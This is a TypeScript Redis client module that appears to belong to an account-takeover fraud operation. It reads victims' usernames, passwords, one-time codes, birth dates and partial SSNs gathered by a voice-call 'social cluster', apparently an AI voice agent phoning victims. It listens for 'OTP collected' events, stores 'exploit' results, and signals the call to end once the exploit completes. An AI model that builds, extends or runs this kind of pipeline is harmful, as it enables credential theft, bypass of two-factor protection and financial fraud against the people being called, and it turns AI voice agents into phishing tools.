import Redis from 'ioredis';
import { SessionData } from './types';
import { logger } from './logging';

/**
 * Redis client wrapper for session management and pub/sub coordination
 */
export class RedisClient {
  private client: Redis;
  private subscriber: Redis;

  constructor(redisUrl: string = process.env.REDIS_URL || 'redis://localhost:6379') {
    this.client = new Redis(redisUrl, {
      retryStrategy: (times) => {
        const delay = Math.min(times * 50, 2000);
        logger.warn(`Redis connection attempt ${times}, retrying in ${delay}ms`);
        return delay;
      },
      maxRetriesPerRequest: 3,
    });

    this.subscriber = new Redis(redisUrl);

    this.client.on('connect', () => logger.info('[Redis] Connected'));
    this.client.on('error', (err) => logger.error('[Redis] Error:', err));
  }

  /**
   * Get session data from Redis (set by VAPI/Social cluster)
   */
  async getSessionData(sessionId: string): Promise<SessionData | null> {
    try {
      const keys = [
        `session:${sessionId}:username`,
        `session:${sessionId}:password`,
        `session:${sessionId}:otp`,
        `session:${sessionId}:dob`,
        `session:${sessionId}:ssn4`,
      ];

      const values = await this.client.mget(...keys);
      
      if (!values[0] || !values[1]) {
        logger.warn(`[Redis] Incomplete session data for ${sessionId}`);
        return null;
      }

      return {
        sessionId,
        username: values[0]!,
        password: values[1]!,
        otp: values[2] || undefined,
        dob: values[3] || undefined,
        ssn4: values[4] || undefined,
      };
    } catch (error) {
      logger.error('[Redis] Failed to get session data:', error);
      return null;
    }
  }

  /**
   * Store execution results back to Redis
   */
  async setExploitResult(sessionId: string, result: {
    success: boolean;
    duration: number;
    agentScore?: number;
    bundleUrl?: string;
    error?: string;
  }): Promise<void> {
    try {
      await this.client.setex(
        `exploit:${sessionId}:result`,
        3600, // 1 hour TTL
        JSON.stringify(result)
      );
      logger.info(`[Redis] Stored exploit result for ${sessionId}`);
    } catch (error) {
      logger.error('[Redis] Failed to store exploit result:', error);
      throw error;
    }
  }

  /**
   * Subscribe to social cluster events (OTP collected, call ended, etc.)
   */
  async subscribeToSocialEvents(handler: (channel: string, message: any) => Promise<void>): Promise<void> {
    await this.subscriber.subscribe('social:otp_collected', 'social:call_ended');
    
    this.subscriber.on('message', async (channel, message) => {
      try {
        const data = JSON.parse(message);
        logger.info(`[Redis] Received event on ${channel}:`, data);
        await handler(channel, data);
      } catch (error) {
        logger.error('[Redis] Error handling message:', error);
      }
    });
  }

  /**
   * Publish exploit completion event (for VAPI to close call)
   */
  async publishExploitCompleted(sessionId: string, result: any): Promise<void> {
    try {
      await this.client.publish(
        'exploit:completed',
        JSON.stringify({ sessionId, ...result })
      );
      logger.info(`[Redis] Published exploit completion for ${sessionId}`);
    } catch (error) {
      logger.error('[Redis] Failed to publish completion:', error);
    }
  }

  /**
   * Health check
   */
  async ping(): Promise<boolean> {
    try {
      const result = await this.client.ping();
      return result === 'PONG';
    } catch {
      return false;
    }
  }

  /**
   * Cleanup
   */
  async disconnect(): Promise<void> {
    await this.client.quit();
    await this.subscriber.quit();
    logger.info('[Redis] Disconnected');
  }
}
